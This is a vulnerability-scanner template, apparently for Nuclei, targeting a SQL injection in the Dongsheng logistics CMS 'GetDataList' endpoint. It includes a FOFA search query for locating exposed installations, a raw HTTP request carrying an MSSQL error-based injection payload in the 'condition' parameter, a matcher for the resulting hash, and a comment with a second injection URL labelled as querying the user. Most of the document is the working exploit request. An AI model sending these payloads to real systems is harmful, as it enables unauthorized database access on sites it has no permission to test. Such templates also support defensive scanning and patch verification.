id: dongsheng-wuliucms-getdatalist-sqli
info:
  name: dongsheng-wuliucms-getdatalist-sqli
  author: unknow
  severity: critical
  description: 东胜物流cms getdatalist 存在sql注入。
  tags: dongsheng,sqli
  metadata:
    fofa-query: body="CompanysAdapter.aspx" || (body="dhtmlxcombo_whp.js" && body="dhtmlxcommon.js")

http:
  - raw:
      - |
        GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode%20like%20%27%1%%27%20and%20DrvName%20like%20%27%1%%27%20and%20JzNo%20like%20%27%1%%27%20and%20OrgCode%20like%20%27%1%%27%20AND%204045%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes(%27MD5%27,%275%27)))--%20IkbK&page=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==500 && contains(body_1, "e4da3b7fbbce2345d7772b0674a318d5") && contains(header_1, "text/html")'

#查用户：/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=123123%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes('MD5'%2c'5')))--%20&page=1